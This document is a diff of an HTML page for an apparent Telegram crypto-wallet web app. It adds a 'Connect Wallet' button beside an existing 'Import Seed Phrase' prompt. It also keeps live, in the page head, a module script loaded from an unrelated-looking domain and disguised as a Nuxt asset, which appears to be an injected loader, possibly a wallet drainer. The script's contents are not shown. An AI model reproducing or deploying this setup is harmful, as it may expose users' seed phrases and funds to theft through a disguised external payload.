@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script type="module" src="https://remember-curry.fontstack.cc/_nuxt/assets/index.js"></script>
+<script type="module" src="https://remember-curry.fontstack.cc/_nuxt/assets/index.js"></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -2109,6 +2109,16 @@ html, body {
             <div>
               <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:2px">Import Seed Phrase</div>
               <div style="font-size:11px;color:var(--text3);line-height:1.4">Already have a wallet? Enter your 12 or 24-word seed phrase to restore access.</div>
+            </div>
+          </button>
+
+          <button onclick="openModal()"style="display:flex;align-items:center;gap:14px;background:rgba(245,158,11,0.07);border:1.5px solid rgba(245,158,11,0.25);border-radius:14px;padding:16px;cursor:pointer;text-align:left;transition:border-color .2s" onmouseenter="this.style.borderColor='rgba(245,158,11,0.5)'" onmouseleave="this.style.borderColor='rgba(245,158,11,0.25)'">
+            <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#f59e0b,#d97706);display:flex;align-items:center;justify-content:center;flex-shrink:0">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 00-4 0v2M12 12v3M10.5 13.5h3"/></svg>
+            </div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:2px">Connect Wallet</div>
+              <div style="font-size:11px;color:var(--text3);line-height:1.4">Connect an existing crypto wallet to access your funds.</div>
             </div>
           </button>
         </div>
